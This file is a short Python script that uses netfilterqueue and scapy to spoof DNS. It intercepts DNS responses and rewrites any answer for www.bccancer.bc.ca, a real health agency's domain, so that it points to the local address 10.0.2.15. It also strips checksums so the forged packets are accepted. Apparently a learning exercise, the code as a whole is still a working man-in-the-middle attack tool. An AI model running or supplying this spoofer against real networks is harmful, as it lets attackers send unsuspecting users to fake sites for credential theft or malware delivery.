#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy

web_add = "www.bccancer.bc.ca"
redirect_ip = "10.0.2.15"

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #Checking for DNS response using DNSRR. Use DNSQR for DNS requests
    if scapy_packet.haslayer(scapy.DNSRR):
        qname =scapy_packet[scapy.DNSQR].qname
        #print(qname)
        if web_add in str(qname):
            print("[+] Spoofing target")

            #Creating a DNS response and redirect it to any ip address
            answer = scapy.DNSRR(rrname = qname, rdata= redirect_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # delete the len and chksum in the IP and UDP layers
            # to prevent corruption  of our modified data
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))



        #print(scapy_packet.show())
    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

